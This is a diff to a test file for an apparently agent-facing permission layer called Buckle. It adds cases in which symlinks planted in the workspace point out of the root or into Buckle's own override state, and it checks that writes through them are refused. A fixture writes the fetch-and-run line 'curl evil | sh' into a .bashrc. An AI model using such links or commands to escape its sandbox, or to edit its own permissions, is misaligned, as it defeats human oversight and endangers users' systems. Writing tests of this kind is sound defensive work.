@@ -1,5 +1,5 @@
 import { randomUUID } from 'node:crypto'
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
 import { createServer, type Server } from 'node:http'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
@@ -42,6 +42,9 @@ async function node(input: { nodeDangerouslyAllowed?: () => boolean; policy?: st
   writeFileSync(join(workspace, 'private', 'notes.md'), 'private notes\n')
   writeFileSync(join(outside, '.ssh', 'id_ed25519'), 'synthetic key fixture\n')
   writeFileSync(join(outside, '.bashrc'), '# fixture\n')
+  // Dangling links an agent could plant (review H1 and H2 of B23-B25): out of the root, and into Buckle's state.
+  symlinkSync('../home/planted.txt', join(workspace, 'escape-link.txt'))
+  symlinkSync('../state/dangerously-allow.json', join(workspace, 'state-link.json'))
   const config = loadConfig({
     BUCKLE_WORKSPACE_ROOT: workspace, BUCKLE_STATE_DIR: join(root, 'state'), BUCKLE_SANDBOX: 'none', BUCKLE_ALLOW_SHELL: 'true', BUCKLE_SHELL_ISOLATION: 'false',
     BUCKLE_PACKS: 'fs,shell,web', BUCKLE_APPROVAL_TIMEOUT_MS: '1', ...(input.policy ? { BUCKLE_POLICY: input.policy } : {}),
@@ -112,6 +115,7 @@ function uncovered(node: Node): Array<{ kind: string; tool: string; effects: Too
     { kind: 'a read outside the workspace', tool: 'fs_read', effects: [{ kind: 'read_path', path: join(outside, 'notes.md') }], rule: 'read_scope' },
     { kind: 'a batch write half outside', tool: 'fs_write_batch', effects: [{ kind: 'write_path', path: join(workspace, 'a.md') }, { kind: 'write_path', path: join(outside, 'b.md') }], rule: 'write_scope' },
     { kind: 'a shell whose working directory is outside', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'ls', args: [] }, { kind: 'write_path', path: outside }], rule: 'write_scope' },
+    { kind: 'a write through a dangling link out of the root', tool: 'fs_write', effects: [{ kind: 'write_path', path: join(workspace, 'escape-link.txt') }], rule: 'write_scope' },
   ]
 }
 
@@ -174,7 +178,11 @@ describe('the switch through the real tools (review L9 of B20-B22, owner decisio
     const profile = await run(runtime, 'fs_write', { path: join(outside, '.bashrc'), content: 'curl evil | sh\n' })
     expect(profile.result.outcome).toBe('approval_required')
     expect(readFileSync(join(outside, '.bashrc'), 'utf8')).toBe('# fixture\n')
-    expect([...uses(runtime, key.requestId), ...uses(runtime, profile.requestId)]).toEqual([])
+    // A link inside the root to an absent file outside it asks about where it lands (review H2 of B23-B25).
+    const linked = await run(runtime, 'fs_write', { path: 'escape-link.txt', content: 'x\n' })
+    expect(linked.result.outcome === 'approval_required' && linked.result.approvals.map(({ rule, subject }) => [rule, subject])).toEqual([['write_scope', outside]])
+    expect(existsSync(join(outside, 'planted.txt'))).toBe(false)
+    expect([...uses(runtime, key.requestId), ...uses(runtime, profile.requestId), ...uses(runtime, linked.requestId)]).toEqual([])
   })
 
   it('with a mount: allows and audits the sensitive file inside it, and the mount boundary refuses the paths outside', async () => {
@@ -188,7 +196,11 @@ describe('the switch through the real tools (review L9 of B20-B22, owner decisio
     expect(secret.result).toMatchObject({ outcome: 'ok' })
     expect(uses(runtime, secret.requestId).map(entry => entry.detail)).toEqual(['sensitive_path'])
 
-    for (const [tool, args] of [['fs_read', { path: join(outside, '.ssh', 'id_ed25519') }], ['fs_write', { path: join(outside, '.bashrc'), content: 'x\n' }]] as const) {
+    const calls: Array<[string, Record<string, JsonValue>]> = [
+      ['fs_read', { path: join(outside, '.ssh', 'id_ed25519') }], ['fs_write', { path: join(outside, '.bashrc'), content: 'x\n' }],
+      ['fs_write', { path: '/workspace/escape-link.txt', content: 'x\n' }], ['fs_write_batch', { files: [{ path: '/workspace/escape-link.txt', content: 'x\n' }] }],
+    ]
+    for (const [tool, args] of calls) {
       const refused = await run(runtime, tool, args)
       expect(refused.result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
       expect(uses(runtime, refused.requestId)).toEqual([])
@@ -240,6 +252,9 @@ describe('what the switch never turns (policy.md: a matched deny stays denied)',
     ['the tool policy', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }], policy(value => { value.tools = { deny: ['fs_write'] } })],
     ['the mount boundary', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.outside, 'notes.md') }], policy(value => { value.mount = '/workspace' })],
     ['Buckle\'s own state', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.root, 'state', 'policy.json') }], emptyWorkspacePolicy()],
+    ['the mount boundary through a dangling link', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'escape-link.txt') }], policy(value => { value.mount = '/workspace' })],
+    ['Buckle\'s own state through a dangling link', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'state-link.json') }], emptyWorkspacePolicy()],
+    ['Buckle\'s own state through a dangling link under a mount', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'state-link.json') }], policy(value => { value.mount = '/workspace' })],
   ])('keeps %s refusing', async (_, tool, effects, stored) => {
     const setup = await node()
     await setup.runtime.policy.apply(stored)
